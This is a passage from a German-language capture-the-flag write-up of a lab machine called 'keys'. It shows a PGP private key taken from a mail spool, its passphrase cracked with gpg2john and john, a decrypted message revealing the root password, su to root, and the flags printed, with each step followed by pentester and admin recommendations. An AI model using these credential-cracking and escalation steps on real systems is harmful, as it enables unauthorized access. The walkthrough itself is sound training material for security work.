+<span class="command">----r-----  1 root steve 1793 Oct 28  2021 private_key.gpg</span></pre>
+                      <div class="prompt">steve@keys:/var/spool/mail$ <span class="command">cat private_key.gpg</span></div>
+                      <pre>
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+lQsBGF6hgBCACasV92gCKq4oK/LBX1n7xF6aR9Lf642MCjVE9vnP8q2YilmKpd
+[...]
+=l+1
+-----END PGP PRIVATE KEY BLOCK-----</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der PGP Private Key (`private_key.gpg`, kopiert als `hacki`) wird mit `gpg2john` verarbeitet, um einen Hash für `john` zu erstellen (`ka`). `john` wird dann mit `rockyou.txt` verwendet, um die Passphrase des PGP-Schlüssels zu knacken.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Passphrase geknackt!</span> `john` findet die Passphrase `<span class="password">youdidit</span>` für den PGP-Schlüssel, der zu `root@keys.com` gehört.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Importieren Sie den PGP-Schlüssel (`hacki`) in Ihr GPG-Keyring (`gpg --import hacki`). Entschlüsseln Sie dann die Nachricht (`msg`, enthält `.important_message.asc`) mit der gefundenen Passphrase (`gpg --passphrase youdidit -d msg`).
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke Passphrasen für PGP-Schlüssel. Speichern Sie private Schlüssel sicher.</p>
+             <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Angreifer-System</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hacki</span></div> <span class="comment">(PGP Private Key hier einfügen)</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gpg2john hacki > ka</span></div>
+                     <pre>File hacki</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt ka</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+[...]
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">youdidit         (root@keys.com)</span>
+1g 0:00:00:01 DONE (2022-10-13 11:45) 0.5555g/s 29.88p/s 29.88c/s 29.88C/s you..youk
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der private PGP-Schlüssel (`hacki`) wird importiert. Die verschlüsselte Nachricht (`msg`, enthält `.important_message.asc`) wird mit der geknackten Passphrase `youdidit` entschlüsselt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Die Entschlüsselung ist erfolgreich!</span> Die Nachricht enthält das Root-Passwort im Klartext: `<span class="password">th3_h!dd3n_m3ss4g3</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `su root` und das Passwort `th3_h!dd3n_m3ss4g3`, um Root-Zugriff zu erlangen.
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie keine Klartext-Passwörter in PGP-Nachrichten. Ändern Sie das Root-Passwort. Speichern Sie private Schlüssel sicher.</p>
+             <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Angreifer-System</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048/private]
+└─# <span class="command">mv ~/hacki .</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048/private]
+└─# <span class="command">gpg --batch --import hacki</span></div>
+                     <pre>
+gpg: /root/.gnupg/trustdb.gpg: trustdb created
+gpg: key A075831A574B572D: public key "root@keys.com" imported
+gpg: key A075831A574B572D: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048]
+└─# <span class="command">vi msg</span></div> <span class="comment">(PGP-Nachricht hier einfügen)</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048]
+└─# <span class="command">chmod 600 msg</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/id_rsa/2048]
+└─# <span class="command">gpg --ignore-mdc-error --passphrase youdidit -d msg</span></div>
+                     <pre>
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 2048-bit RSA key, ID A075831A574B572D, created 2021-10-28
+      "root@keys.com"
+<span class="password">Root Password is th3_h!dd3n_m3ss4g3</span>gpg: WARNING: message was not integrity protected</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root Exploit)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `steve` wird der Befehl `su root` ausgeführt und das zuvor entschlüsselte Passwort `th3_h!dd3n_m3ss4g3` eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Root-Zugriff erfolgreich!</span> Der Wechsel zum Root-Benutzer gelingt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lesen Sie die Root-Flag und führen Sie Aufräumarbeiten durch.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Root-Passwort. Überprüfen Sie das System auf unbefugte Änderungen.</p>
+            <div class="code-block">
+                <div class="terminal"> <span class="comment"># Auf Zielsystem (als steve)</span>
+                    <div class="prompt">steve@keys:/var/spool/mail$ <span class="command">su root</span></div>
+                    <pre>Password: <span class="command">th3_h!dd3n_m3ss4g3</span></pre>
+                    <div class="prompt">root@keys:/var/spool/mail# <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt">root@keys:/var/spool/mail# </div>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen. Die User-Flag wird aus den zuvor gesammelten Teilen zusammengesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag lautet `<span class="password">AeQgWYpsNcuL4BzXH2p1</span>`. Die zusammengesetzte User-Flag lautet `<span class="password">4vJkfrYnYT7Q6PwVDll6</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags wurden erfolgreich erfasst.
+             <br><strong>Empfehlung (Admin):</strong> Sichern Sie das System gemäß den vorherigen Empfehlungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@keys:/var/spool/mail# <span class="command">cat /root/root.txt</span></div> <span class="comment">(Pfad angenommen)</span>
+                     <pre><span class="password">AeQgWYpsNcuL4BzXH2p1</span></pre>
+                      <pre><span class="comment">
+# Zusammensetzen der User-Flag:
+# useless (youser.txt): 4vJkf*
+# jack    (usAr.txt):   *rYnYT
+# rachel  (u$eR.txt):   7Q6Pw* (Annahme, da im Log nicht explizit gecattet)
+# steve   (u__s__e__r.txt): *VDll6
+# Ergebnis: 4vJkfrYnYT7Q6PwVDll6
+</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">User Flag (Zusammengesetzt)</div>
+                     <div class="flag-value"><span class="password">4vJkfrYnYT7Q6PwVDll6</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">AeQgWYpsNcuL4BzXH2p1</span></div>
+                 </div>
+             </div>
+         </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. Oktober 2022</p>
+    </footer>
+</body>
+</html>
